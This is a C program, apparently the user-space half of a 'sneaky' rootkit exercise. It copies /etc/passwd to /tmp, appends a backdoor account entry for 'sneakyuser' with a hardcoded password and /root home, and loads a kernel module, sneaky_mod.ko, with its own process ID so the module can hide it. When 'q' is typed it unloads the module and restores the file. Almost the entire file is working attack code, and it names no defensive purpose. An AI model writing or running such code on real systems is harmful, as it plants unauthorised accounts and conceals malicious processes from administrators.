#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/string.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <fcntl.h>

pid_t process_pid;

void endProgram(void){
	char *rmCmd[] = {"rmmod","sneaky_mod.ko",0};
	char *cpCmd[] = {"cp", "/tmp/passwd", "/etc/passwd",0};
	pid_t rmPid, cpPid;
	int status;

	rmPid = fork();
	if(rmPid == 0){
		// 1. Unload the sneaky module using rmmod
		printf("unload mod...\n");
		execvp(rmCmd[0],rmCmd);
	}else{
		do{
			cpPid = waitpid(rmPid, &status, WUNTRACED | WCONTINUED);
			if(cpPid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while(!WIFEXITED(status) && !WIFSIGNALED(status));
		printf(" restore file...\n");
		// 2. Restore the /etc/passwd file by copying tmp/passwd into the file
		execvp(cpCmd[0],cpCmd);
		remove(cpCmd[1]);
		printf("DONE\n");
	}
	
}
	
void fileProc(void){
	// 1. Copy /etc/passwd to /tmp/passwd
	char * fname = "/etc/passwd";
	char * pwd = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
	char * cmd1[] = {"cp", fname,"/tmp/passwd", 0};
	char * cmd2[] = {"echo", pwd, 0}; 
	pid_t cpid, wid;
	int status;
	cpid = fork();
	if(cpid == 0){
		//process to copy files
		printf("copying passwd file to user space\n");
		execvp(cmd1[0],cmd1);
	}else{
		do{
			wid = waitpid(cpid, &status, WUNTRACED | WCONTINUED);
			if(wid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
		printf("Done waiting...\n");
		//process to write to user
		int fd = open(fname, O_RDWR | O_APPEND, S_IRUSR | S_IWUSR);
		dup2(fd,1);
		execvp(cmd2[0],cmd2);
		close(fd);
	}
}

void kernelProc(void){
	printf("Execute kernel process here\n");
	pid_t inpid, sneakpid;
	int status;
	inpid = fork();
	if(inpid == 0){
		printf("install the kernel mod");
		char arg[15]= ""; 
		snprintf(arg, sizeof(arg), "toHide=%d", process_pid);
		char * modCmd[] = {"insmod", "sneaky_mod.ko",arg,0};
		execvp(modCmd[0],modCmd);
	}else{
		do{
			sneakpid = waitpid(inpid, &status, WUNTRACED | WCONTINUED);
			if(sneakpid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while(!WIFEXITED(status) && !WIFSIGNALED(status));
		// Enter loop get input character until q for quit
		int c;
		c = getchar();
		while(c != 'q'){
			//putchar(c);
			c = getchar();
		}
		printf("typed a q so begin to get rid of everything\n");
		// terminate
		endProgram();
	}
}

int main(int argc, char *argv[]){
	pid_t fpid, kpid;
	int status;
	process_pid = getpid();
	printf("sneaky_process pid =%d\n",process_pid);
	
	fpid = fork();

	if(fpid == 0){
		printf("executing file process...\n");
		fileProc();
	}else{
		do{
			kpid = waitpid(fpid, &status, WUNTRACED | WCONTINUED);
			if(kpid == -1){
				perror("waitpid");
				exit(EXIT_FAILURE);
			}
		} while(!WIFEXITED(status) && !WIFSIGNALED(status));
		kernelProc();
	}

}
